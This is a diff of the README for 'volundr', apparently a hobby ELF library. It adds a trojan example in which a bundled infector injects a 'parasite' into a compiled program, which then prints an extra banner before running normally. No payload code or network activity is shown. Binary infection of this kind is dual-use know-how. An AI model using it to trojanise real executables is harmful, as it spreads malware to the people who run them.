@@ -2,18 +2,54 @@
 and might play with and see how far I can go with it.
     Currently this code is quite useless and need some effort to get this moving forward. ]]
 
-volundr-0.1/        = Evil agent ;)
-volundr-0.1/elf/    = ELF library
-volundr-0.1/common  = Common library
+elf/            = ELF library
+asm/            = syscalls
+common/         = Common library
+examples/       = General use of API (dummy trojan included)
 
-evil macros:
 
-    __DEBUG__               : turn debug on
-    __ELF_SYSV__            : operating system specification
+## Trojan ET_EXEC example
+    *** ET_DYN also supported ***
 
-# Currently only printing stuff
+    $ cat victim.c
+    #include <stdio.h>
+    int main(int argc, char **argv) {
+        int i;
+        for (i = 0; i < 10; ++i)
+            printf("%d\n",i);
+        return 0;
+    }
+     ---snip---
+     $ gcc victim.c && ./a.out
+     0
+     1
+     2
+     3
+     4
+     5
+     6
+     7
+     8
+     9
+     ---snip---
+     $ LD_LIBRARY_PATH=./volundr ./example-infect01 a.out parasite
+    Done!
+    Try running a.out
+     ---snip---
+     $ ./a.out
+    -= Objective reality doesn't exist! =-    <---------- yay!
+    0
+    1
+    2
+    3
+    4
+    5
+    6
+    7
+    8
+    9
 
-## Example output
+## Parsing Example output
 
      $ cat out.txt 
     -= Volundr reading from a.out of 8608 bytes =-
